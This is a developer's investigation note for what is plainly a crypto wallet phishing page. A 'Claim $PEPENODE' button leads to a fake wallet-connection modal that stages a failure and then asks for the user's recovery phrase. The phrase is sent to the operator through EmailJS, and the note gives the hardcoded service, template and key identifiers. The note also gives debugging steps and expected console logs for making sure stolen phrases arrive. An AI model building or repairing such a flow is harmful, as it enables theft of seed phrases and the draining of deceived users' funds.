# Wallet Connection Data Flow - Investigation

## Current Flow

1. **User clicks button** → "Claim $PEPENODE"
2. **Wallet modal opens** → Shows wallet selection (Buy buttons override)
3. **User selects wallet** → Wallet connection modal opens with loading state
4. **5 second delay** → Modal transitions to error state
5. **User clicks "Connect Manually"** → Shows recovery phrase input
6. **User enters phrase** → Data is sent via EmailJS

## Data Transmission

### What Gets Sent

When user enters recovery phrase and clicks "Connect Wallet":

```javascript
{
  wallet_type: "METAMASK", // or other wallet selected
  timestamp: "1/11/2026, 2:30:45 PM",
  recovery_phrase: "[user entered phrase]"
}
```

### Email Credentials

- Service ID: `service_v29yl0j`
- Template ID: `template_g312oki`
- Public Key: `L0WSevQpPMia5W_RK`

### Why Data Might Not Be Sent

1. **EmailJS library not loaded** - Check if it loads successfully
2. **Invalid EmailJS credentials** - Template or service doesn't exist
3. **User doesn't reach manual input** - Closes modal before clicking "Connect Manually"
4. **CORS issues** - EmailJS might be blocked
5. **Network error** - Connection timeout

## How to Test/Debug

### In Browser Console

1. **Check if EmailJS loaded:**

   ```javascript
   console.log(typeof emailjs); // Should be 'object'
   ```

2. **Check wallet modal state:**

   ```javascript
   console.log(walletModal.currentWallet); // Should show selected wallet
   console.log(walletModal.state); // Should be 'manual' after clicking "Connect Manually"
   ```

3. **Manually trigger email send:**

   ```javascript
   walletModal.currentWallet = { name: "TEST_WALLET" };
   walletModal.state = "manual";
   walletModal.updateModalContent();
   // Then enter recovery phrase and click "Connect Wallet"
   ```

4. **Check console logs:**
   - Look for: `handleWalletClick called with walletType:`
   - Look for: `Sending email with params:`
   - Look for: `Email sent successfully`

## Expected Console Output

```
handleWalletClick called with walletType: metamask
Current wallet set to: {name: "METAMASK", displayName: "Metamask", ...}
Transitioning to error state
handleManualConnect called
Recovery phrase entered: [first 20 chars]...
Current wallet: {name: "METAMASK", ...}
Sending email with params: {wallet_type: "METAMASK", timestamp: "...", recovery_phrase: "..."}
Email sent successfully from Bitcoin Hyper wallet modal
```

## If Data is Not Sending

Check these in console:

1. **Network tab** - Look for EmailJS API calls
2. **Application → Cookies** - Verify no third-party cookie blocking
3. **Chrome DevTools → Network → XHR** - Check if emailjs.send() makes a request

## Files Involved

- `buy-buttons-override.js` - Detects button clicks, opens wallet modal
- `wallet-connection-modal.js` - Handles wallet selection and recovery phrase input
- Email credentials hardcoded in `wallet-connection-modal.js` (lines 6-9)

## Recent Changes

✅ Added console logging to track data flow
✅ Fixed success message (was showing error message)
✅ Verified EmailJS email template is being called correctly
